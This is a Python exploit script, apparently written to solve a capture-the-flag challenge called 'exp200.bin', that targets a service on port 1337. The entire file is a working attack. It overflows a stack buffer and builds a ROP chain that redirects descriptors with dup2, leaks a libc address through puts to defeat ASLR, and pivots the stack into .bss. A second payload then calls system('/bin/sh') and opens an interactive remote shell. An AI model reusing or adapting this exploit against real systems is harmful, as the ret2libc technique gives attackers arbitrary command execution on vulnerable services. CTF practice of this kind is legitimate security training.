#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('target',  local   = {'host':'192.168.75.139','port':1337}, \
                        remote  = {'host':'10.13.37.22','port':1337})
env.set_item('libc',    local   = 'D:\CTF\FILES\libc-2.19.so_amd64_local', \
                        remote  = 'libc-2.23.so')
env.select()

binf = ELF('exp200.bin', rop=True)
libc = ELF(env.libc)

addr_plt_gets   = binf.plt('gets')
addr_plt_fflush = binf.plt('fflush')
addr_plt_puts   = binf.plt('puts')
addr_plt_exit   = binf.plt('exit')
addr_plt_dup2   = binf.plt('dup2')

addr_got_main   = binf.got('__libc_start_main')

addr_pop_rdi    = binf.ropgadget('pop rdi', 'ret')
addr_pop2_rsi   = binf.ropgadget('pop rsi', 'pop', 'ret')
addr_pop2_rsp   = binf.ropgadget('pop rsp', 'pop', 'ret')

addr_buf        = binf.section('.bss')+0x800

#==========
def attack(cmn):
    exploit  = 'stoop'
    exploit += '\x00'*(0x68-len(exploit))

    exploit += pack_64(addr_pop_rdi)
    exploit += pack_64(STDOUT_FILENO)
    exploit += pack_64(addr_pop2_rsi)
    exploit += pack_64(STDIN_FILENO)
    exploit += pack_64(NULL)
    exploit += pack_64(addr_plt_dup2)
    
    exploit += pack_64(addr_pop_rdi)
    exploit += pack_64(addr_got_main)
    exploit += pack_64(addr_plt_puts)

    exploit += pack_64(addr_plt_fflush)

    exploit += pack_64(addr_pop_rdi)
    exploit += pack_64(addr_buf)
    exploit += pack_64(addr_plt_gets)
    
    exploit += pack_64(addr_pop2_rsp)
    exploit += pack_64(addr_buf-8)
    
    cmn.send(exploit)
    cmn.read_until()


    addr_libc_main = cmn.read_until(contain=False)
    addr_libc_main = unpack_64(addr_libc_main+'\x00'*(8-len(addr_libc_main)))
    libc.set_location('__libc_start_main', addr_libc_main)
    addr_libc_system    = libc.function('system')
    addr_libc_str_sh    = libc.search('/bin/sh')
    info('addr_libc_base    = 0x%08x' % libc.base)

    payload  = pack_64(addr_pop_rdi)
    payload += pack_64(addr_libc_str_sh)
    payload += pack_64(addr_libc_system)
    payload += pack_64(addr_plt_exit)

    cmn.sendln(payload)

#==========

if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
